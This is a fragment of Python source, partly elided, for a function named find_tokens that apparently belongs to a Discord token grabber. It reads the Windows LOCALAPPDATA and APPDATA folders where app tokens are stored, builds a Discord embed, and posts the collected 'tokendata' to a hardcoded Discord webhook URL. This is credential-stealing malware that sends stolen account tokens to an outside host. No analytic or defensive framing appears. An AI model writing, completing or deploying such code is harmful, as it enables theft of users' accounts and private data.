...
def find_tokens():
    tokens = []
    hook1 = "https://discord.com/api/webhooks/1301337841980145735/-aUxRGB5mRVYhTZ3JCy5Uww3SKcYTiRZ4UiBNeQU3vw0LE6Bhn24e7--yYzEcS17txUa"
    local = os.getenv("localAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
    ...
    "embeds": [
      ...
      "image": {
                "url": "https://cdn.discordapp.com/attachments/1301625981299331122/1301711111325745222/3M.png?ex=67257871&is=672426f1&hm=eeb0fe418116df16500ddcae80faf4e606a58321cb5336fb5def925789017471&",
                "height": 0,
                "width": 0
            }
      }
    ...
    requests.post(hook1, data=json.dumps(tokendata), headers=headers)
